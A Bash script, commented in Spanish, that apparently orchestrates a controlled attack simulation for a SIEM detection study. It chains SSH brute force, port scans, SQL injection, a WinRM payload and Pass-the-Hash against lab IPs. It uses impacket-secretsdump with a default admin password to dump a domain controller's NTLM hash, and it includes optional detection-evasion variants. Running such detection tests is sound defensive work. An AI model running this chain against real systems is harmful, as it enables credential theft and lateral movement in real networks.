#!/usr/bin/env bash
# Ejecuta los 5 ataques definidos en la metodologia, 5 repeticiones cada uno
# (segun Fase 3 / Escenario 2 del documento), dejando todo registrado en
# log_ataques.csv para la correlacion posterior en Evaluacion/.
#
# Editar las variables de objetivos segun las IPs reales de tu topologia.
set -uo pipefail
cd "$(dirname "$0")"
export ESCENARIO="${ESCENARIO:-2}"

DC_IP="${DC_IP:-192.168.10.20}"
WEB_URL="${WEB_URL:-http://192.168.10.10/index.php?id=1}"
WIN_WS_IP="${WIN_WS_IP:-192.168.20.30}"
SSH_TARGET="${SSH_TARGET:-192.168.20.40}"
SSH_USER="${SSH_USER:-usuario}"
REPETICIONES="${REPETICIONES:-5}"
DOMAIN_ADMIN="${DOMAIN_ADMIN:-EMPRESA/Administrator}"
DOMAIN_ADMIN_PASS="${DOMAIN_ADMIN_PASS:-P@ssw0rd}"

echo "=== Escenario 2: Simulacion de ataques controlados (${REPETICIONES}x cada uno, 5 tecnicas) ==="

# Captura UNA vez el hash NTLM real del DC (equivalente a mimikatz/secretsdump
# en un ejercicio autorizado) y lo reutiliza en las repeticiones de
# Pass-the-Hash, tal como ocurriria en una cadena de ataque real: se captura
# una vez y se reutiliza para movimiento lateral.
NTHASH=""
if command -v impacket-secretsdump &>/dev/null; then
  echo "[*] Capturando hash NTLM del DC (secretsdump) para Pass-the-Hash..."
  OUT="$(impacket-secretsdump "${DOMAIN_ADMIN%/*}/Administrator:${DOMAIN_ADMIN_PASS}@${DC_IP}" 2>/dev/null || true)"
  NTHASH="$(echo "$OUT" | grep -m1 '^Administrator:500:' | cut -d: -f4)"
  [ -n "$NTHASH" ] && echo "[*] Hash NTLM capturado." || echo "[!] No se pudo capturar el hash; se omitira Pass-the-Hash."
fi

for i in $(seq 1 "${REPETICIONES}"); do
  echo "--- Repeticion ${i}/${REPETICIONES} ---"
  ./attack1_bruteforce_ssh.sh "${SSH_TARGET}" "${SSH_USER}"      || true
  ./attack2_portscan.sh       "${DC_IP}"                          || true
  ./attack4_sqli.sh           "${WEB_URL}"                        || true
  # El payload por WinRM (ataque 5) se ejecuta ANTES del Pass-the-Hash (ataque
  # 3): ambos autentican como 'Administrator', y un Pass-the-Hash contra el DC
  # deja ~2-4 min en los que la autenticacion de ese mismo usuario por WinRM
  # contra la estacion devuelve WinRMAuthorizationError (contencion de
  # credenciales del mismo principal). Ejecutar el payload primero evita esa
  # ventana sin afectar la validez del estudio de deteccion: cada tecnica se
  # ejecuta igual sus 5 veces y se detecta de forma independiente.
  { echo "${DOMAIN_ADMIN}"; echo "${DOMAIN_ADMIN_PASS}"; } | \
    ./attack5_payload_exec.sh "${WIN_WS_IP}"                      || true
  if [ -n "${NTHASH}" ]; then
    ./attack3_pass_the_hash.sh "${DC_IP}" Administrator "${NTHASH}" || true
  fi
  sleep 15
done

# --- Variantes SIGILOSAS (evasion) -------------------------------------------
# Ademas de las 5 tecnicas ruidosas, se ejecutan 3 variantes sigilosas que
# intentan evadir la deteccion (fuerza bruta lenta, escaneo evasivo, SQLi
# ofuscado). Dan una curva de deteccion realista: es esperable que el SIEM
# detecte MENOS las sigilosas, lo cual es un resultado mas creible y permite
# recomendar mejoras. Activar con INCLUIR_SIGILOSOS=1.
if [ "${INCLUIR_SIGILOSOS:-0}" = "1" ]; then
  echo "=== Variantes SIGILOSAS (${REPETICIONES}x cada una, 3 tecnicas de evasion) ==="
  for i in $(seq 1 "${REPETICIONES}"); do
    echo "--- Repeticion sigilosa ${i}/${REPETICIONES} ---"
    ./sigilosos/attack1b_bruteforce_lento.sh "${SSH_TARGET}" "${SSH_USER}" 40 || true
    ./sigilosos/attack2b_portscan_sigiloso.sh "${DC_IP}"                      || true
    ./sigilosos/attack4b_sqli_evasion.sh      "${WEB_URL}"                    || true
    sleep 15
  done
fi
echo "=== Ataques completados. Revisar $(pwd)/log_ataques.csv ==="
